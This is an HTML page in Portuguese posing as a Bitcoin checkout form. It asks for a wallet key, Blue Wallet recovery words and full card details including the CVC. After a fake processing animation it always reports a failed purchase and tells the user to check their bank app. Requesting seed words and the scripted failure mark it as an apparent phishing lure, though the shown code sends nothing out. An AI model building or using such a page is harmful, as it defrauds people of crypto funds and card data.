<html><head><base href="." />
<meta charset="UTF-8">
<title>Bitcoin Checkout</title>
<style>
    body {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        background: #1a1a1a;
        color: #fff;
        margin: 0;
        padding: 20px;
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .checkout-container {
        background: #2a2a2a;
        border-radius: 15px;
        padding: 30px;
        width: 100%;
        max-width: 600px;
        box-shadow: 0 10px 25px rgba(0,0,0,0.2);
    }

    h1 {
        color: #f7931a;
        text-align: center;
        margin-bottom: 30px;
    }

    .form-group {
        margin-bottom: 20px;
        position: relative;
    }

    label {
        display: block;
        margin-bottom: 8px;
        color: #ccc;
        font-weight: 500;
    }

    input, textarea {
        width: 100%;
        padding: 12px;
        border: 1px solid #444;
        border-radius: 8px;
        background: #333;
        color: #fff;
        font-size: 16px;
        box-sizing: border-box;
        transition: all 0.3s ease;
    }

    input:focus, textarea:focus {
        outline: none;
        border-color: #f7931a;
        box-shadow: 0 0 0 2px rgba(247, 147, 26, 0.2);
    }

    .optional {
        color: #888;
        font-size: 0.8em;
        margin-left: 8px;
    }

    button {
        background: #f7931a;
        color: white;
        border: none;
        padding: 15px 30px;
        border-radius: 8px;
        font-size: 18px;
        cursor: pointer;
        width: 100%;
        transition: all 0.3s ease;
        font-weight: 600;
        position: relative;
        overflow: hidden;
    }

    button:hover {
        background: #e88a18;
        transform: translateY(-1px);
        box-shadow: 0 5px 15px rgba(247, 147, 26, 0.3);
    }

    button:active {
        transform: translateY(1px);
    }

    .error {
        color: #ff4444;
        font-size: 14px;
        margin-top: 5px;
        display: none;
        padding: 8px;
        background: rgba(255, 68, 68, 0.1);
        border-radius: 4px;
    }

    .success {
        background: #ff4444;
        color: white;
        padding: 15px;
        border-radius: 8px;
        text-align: center;
        display: none;
        animation: slideDown 0.5s ease-out;
    }

    .card-info {
        display: grid;
        grid-template-columns: 2fr 1fr 1fr;
        gap: 15px;
    }

    .input-icon {
        position: absolute;
        right: 12px;
        top: 50%;
        transform: translateY(-50%);
        color: #666;
    }

    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        25% { transform: translateX(-10px); }
        75% { transform: translateX(10px); }
    }

    @keyframes slideDown {
        from { transform: translateY(-20px); opacity: 0; }
        to { transform: translateY(0); opacity: 1; }
    }

    .shake {
        animation: shake 0.5s ease-in-out;
    }

    .loading-spinner {
        display: none;
        width: 20px;
        height: 20px;
        border: 3px solid #ffffff;
        border-top: 3px solid transparent;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        position: absolute;
        right: 15px;
        top: 50%;
        transform: translateY(-50%);
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }

    .progress-bar {
        position: absolute;
        bottom: 0;
        left: 0;
        height: 3px;
        width: 0%;
        background: rgba(255,255,255,0.5);
        transition: width 2s linear;
    }
</style>
</head>
<body>
    <div class="checkout-container">
        <h1>
            <svg width="30" height="30" viewBox="0 0 24 24" style="vertical-align: middle; margin-right: 10px;">
                <path fill="#f7931a" d="M23.638 14.904c-1.602 6.43-8.113 10.34-14.542 8.736C2.67 22.05-1.244 15.525.362 9.105 1.962 2.67 8.475-1.243 14.9.358c6.43 1.605 10.342 8.115 8.738 14.548v-.002zm-6.35-4.613c.24-1.59-.974-2.45-2.64-3.03l.54-2.153-1.315-.33-.525 2.107c-.345-.087-.705-.167-1.064-.25l.526-2.127-1.32-.33-.54 2.165c-.285-.067-.565-.132-.84-.2l-1.815-.45-.35 1.407s.974.225.955.237c.535.136.63.486.615.766l-1.477 5.92c-.075.166-.24.406-.614.314.015.02-.96-.24-.96-.24l-.66 1.51 1.71.426.93.242-.54 2.19 1.32.327.54-2.17c.36.1.705.19 1.05.273l-.51 2.154 1.32.33.545-2.19c2.24.427 3.93.257 4.64-1.774.57-1.637-.03-2.58-1.217-3.196.854-.193 1.5-.76 1.68-1.93h.01zm-3.01 4.22c-.404 1.64-3.157.75-4.05.53l.72-2.9c.896.23 3.757.67 3.33 2.37zm.41-4.24c-.37 1.49-2.662.735-3.405.55l.654-2.64c.744.18 3.137.524 2.75 2.084v.006z"/>
            </svg>
            Checkout Bitcoin
        </h1>

        <form id="checkoutForm">
            <div class="form-group">
                <label>Chave da Carteira Bitcoin <span class="optional">(opcional)</span></label>
                <input type="text" id="walletKey" placeholder="Ex: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa">
            </div>

            <div class="form-group">
                <label>Palavras da Blue Wallet <span class="optional">(opcional)</span></label>
                <textarea id="blueWallet" rows="3" placeholder="Digite as 16 palavras separadas por espaço"></textarea>
            </div>

            <div class="form-group">
                <label>Informações do Cartão <span style="color: #ff4444;">*</span></label>
                <input type="text" id="cardNumber" placeholder="Número do Cartão" required maxlength="19">
                <div class="card-info">
                    <input type="text" id="cardName" placeholder="Nome no Cartão" required>
                    <input type="text" id="cardExpiry" placeholder="MM/AA" required maxlength="5">
                    <input type="text" id="cardCVC" placeholder="CVC" required maxlength="4">
                </div>
                <div class="error" id="cardError">Por favor, preencha todos os campos obrigatórios corretamente.</div>
            </div>

            <button type="submit">
                Finalizar Compra
                <div class="loading-spinner" id="spinner"></div>
                <div class="progress-bar" id="progressBar"></div>
            </button>
            <div class="success" id="successMessage">
                <svg width="24" height="24" viewBox="0 0 24 24" style="vertical-align: middle; margin-right: 8px;">
                    <path fill="currentColor" d="M18 6L6 18M6 6l12 12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
</svg>
                Verifique o aplicativo do seu banco!
            </div>
        </form>
    </div>

    <script>
        document.getElementById('checkoutForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const cardNumber = document.getElementById('cardNumber').value;
            const cardName = document.getElementById('cardName').value;
            const cardExpiry = document.getElementById('cardExpiry').value;
            const cardCVC = document.getElementById('cardCVC').value;
            const error = document.getElementById('cardError');
            const success = document.getElementById('successMessage');
            const spinner = document.getElementById('spinner');
            const progressBar = document.getElementById('progressBar');
            const button = document.querySelector('button');

            // Reset error state
            error.style.display = 'none';

            // Validação básica
            if (!cardNumber || !cardName || !cardExpiry || !cardCVC) {
                error.textContent = 'Por favor, preencha todos os campos obrigatórios.';
                error.style.display = 'block';
                error.parentElement.classList.add('shake');
                setTimeout(() => {
                    error.parentElement.classList.remove('shake');
                }, 500);
                return;
            }

            // Validação do número do cartão
            const cleanCardNumber = cardNumber.replace(/\s/g, '');
            if (cleanCardNumber.length !== 16 || !/^\d+$/.test(cleanCardNumber)) {
                error.textContent = 'Número do cartão inválido';
                error.style.display = 'block';
                return;
            }

            // Validação da data de expiração
            const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
            if (!expiryRegex.test(cardExpiry)) {
                error.textContent = 'Data de expiração inválida';
                error.style.display = 'block';
                return;
            }

            // Validação do CVC
            if (!/^\d{3,4}$/.test(cardCVC)) {
                error.textContent = 'CVC inválido';
                error.style.display = 'block';
                return;
            }

            // Simular processamento
            button.textContent = 'Processando...';
            button.disabled = true;
            spinner.style.display = 'block';
            progressBar.style.width = '0%';

            // Animate progress bar
            setTimeout(() => {
                progressBar.style.width = '100%';
            }, 100);

            setTimeout(() => {
                spinner.style.display = 'none';
                success.style.display = 'block';
                button.textContent = 'Compra Falhou!';
                button.style.background = '#ff4444';
            }, 2000);
        });

        // Formatação do número do cartão
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 16) value = value.slice(0, 16);
            e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
        });

        // Formatação da data de expiração
        document.getElementById('cardExpiry').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 4) value = value.slice(0, 4);
            if (value.length > 2) {
                value = value.slice(0, 2) + '/' + value.slice(2);
            }
            e.target.value = value;
        });

        // Formatação do CVC
        document.getElementById('cardCVC').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 4) value = value.slice(0, 4);
            e.target.value = value;
        });
    </script>
</body>
</html>
